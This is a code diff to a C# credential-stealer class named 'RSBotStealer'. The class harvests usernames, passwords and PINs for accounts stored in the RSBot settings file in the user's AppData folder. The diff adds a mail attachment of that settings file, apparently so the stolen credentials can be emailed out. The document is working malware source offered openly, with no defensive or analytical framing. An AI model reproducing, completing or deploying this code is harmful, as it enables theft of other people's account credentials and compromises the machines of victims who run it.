@@ -6,6 +6,7 @@ using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
 using System.Management;
+using System.Net.Mail;
 using System.Net.NetworkInformation;
 using System.Security.Cryptography;
 using System.Text;
@@ -24,6 +25,15 @@ namespace sub.Stealers
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
 
         #region IStealer Members
+
+        private Attachment _attach;
+
+        public Attachment Attachment
+        {
+            get { return _attach; }
+            set { _attach = value; }
+        }
+
         private string _name = "RSBotStealer";
         public string Name
         {
@@ -43,6 +53,7 @@ namespace sub.Stealers
             {
                 Data += "Username: " + acc.UserName + ", Password: " + acc.Password + ", Pin: " + acc.Pin + "\r\n";
             }
+            _attach = new Attachment(_settingsFile);
         }
 
         #endregion
